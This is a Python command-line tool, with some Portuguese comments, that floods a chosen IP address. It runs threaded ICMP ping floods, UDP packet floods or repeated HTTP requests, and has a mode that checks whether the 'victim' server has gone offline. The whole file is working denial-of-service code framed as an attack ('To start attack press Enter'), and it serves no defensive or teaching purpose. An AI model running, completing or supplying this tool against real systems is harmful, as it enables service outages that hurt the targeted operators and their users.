#!/usr/bin/env python3
 
import argparse
from os import system
import requests
import socket
from time import sleep
from threading import Thread
from os import system

from colorama import init, Fore, Back, Style


def banner():
    file_path = "banner.txt"

    with open(file_path, 'r') as file:
    # Ler o conteúdo do arquivo
        content = file.read()

    # Imprimir o conteúdo do arquivo
    print(f"{Fore.RED}{content}{Style.RESET_ALL}")
 
    sleep(3)


def check_vital_sign_of_victim():
    while True:
        response = requests.get(url)
        server_status = response.status_code
        server_status_string = f"{Fore.GREEN}Servidor Online{Style.RESET_ALL}"
                
        if server_status == 200:
            server_status_string = f"{Fore.GREEN}Servidor Online{Style.RESET_ALL}"
        else:
            server_status_string = f"{Fore.RED}Servidor Offline{Style.RESET_ALL}"
                
        print(server_status_string)
        sleep(5)

def poison_file():
    
    print(f"Target => {ip}")

    while True:
        response = requests.get(ip)
        print(f"[VICTIM - STATUS: {response.status_code}]{Fore.RED}Atackking => {ip}{Style.RESET_ALL}")

def poison_udp():
    try:
        

        while True:
            dados = "áêãõÈ" * 6000

            print(f"{Fore.RED}({ip}:{port})Attacking Victim with -> {len(dados)}b{Style.RESET_ALL}")
            # Cria o socket UDP
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            # Envia os dados para o destino
            sock.sendto(dados.encode(), (ip, port))

            # Fecha o socket
            sock.close()
    except Exception as ex:
        print(ex)
 
def poison_icmp():
 
    try:

        while True:
            
            system(f"echo '\e[31m'; ping -c1 -s {payloadlen} {ip}")
    except Exception as ex:
        print(ex)


parse = argparse.ArgumentParser() 
parse.add_argument('-i', '--ip')
parse.add_argument('-t', '--threads', default=1)
parse.add_argument('-m', '--mode', default='attack-icmp')
parse.add_argument('-p', '--port', default=80)


args = parse.parse_args()
ip = args.ip
payloadlen = 10000
port = int(args.port)
thd = int(args.threads)
mode = args.mode
url = f"http://{ip}:{port}"

tlist = []

system("clear") 

banner()

input("To start attack press Enter......")


if mode == 'attack-icmp':
    for __ in range(thd):
        t = Thread(target=poison_icmp)
        tlist.append(t)
        t.start()
    
    for t in tlist:
        t.join()
elif mode == 'attack-udp':
    for __ in range(thd):
        t = Thread(target=poison_udp)
        tlist.append(t)
        t.start()
    
    for t in tlist:
        t.join()

elif mode == 'attack-file':
    poison_file()


elif mode == 'monitor':
    check_vital_sign_of_victim()
